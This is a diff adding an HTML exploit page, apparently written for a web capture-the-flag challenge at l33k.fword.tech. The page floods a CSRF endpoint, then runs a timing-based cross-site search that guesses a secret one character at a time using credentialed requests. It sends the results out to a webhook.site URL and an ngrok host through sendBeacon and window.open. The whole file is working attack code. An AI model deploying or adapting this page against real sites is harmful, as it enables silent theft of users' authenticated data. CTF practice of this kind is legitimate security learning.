@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>star7rix</title>
+    </head>
+    <body>
+
+        <script>
+
+            function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+            }
+            
+            window.doner=false
+
+            window.addEventListener("message", (event) => {
+                if (!window.doner){
+                    window.doner=true
+                    navigator.sendBeacon("https://webhook.site/d3e9a3cf-e428-47b0-9c08-cae3c5007434", event.data)
+                    window.open(`https://d177-183-82-192-34.ngrok.io?${event.data}`)
+                }
+                return;
+                }, false);
+
+
+            function CSRF(){
+                for (let i = 0; i < 100; i++) {
+                    window.open("/csrf.html")                
+                }
+            }
+            
+            function request(query){
+                var start = performance.now()
+                // Measure how long it takes to complete the fetch requests
+                startsWith = window.location.search.substring(1);
+                fetch(`https://l33k.fword.tech/search?query=${startsWith}${query}`, {
+                    mode: 'no-cors',
+                    credentials: 'include'
+                }).then(() => {
+                    var time = performance.now() - start;
+                    console.log(`The string ${query} took ${time} ms.`);
+                    window.postMessage(`Flag: ${startsWith}${query}`, '*');
+
+                })
+            }
+
+            function leak(){
+                charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
+                for( i=0; i<charset.length; i++){
+                    request(charset[i])
+                }
+            }
+
+            async function xploit(){
+                // CSRF to add notes
+                console.log("starting CSRF")
+                CSRF()
+                await sleep(20000)
+
+                console.log("starting Leak")
+                // leak shizz
+                leak()
+
+                await sleep(20000)
+            }
+
+            xploit()
+        </script>
+
+    </body>
+</html>
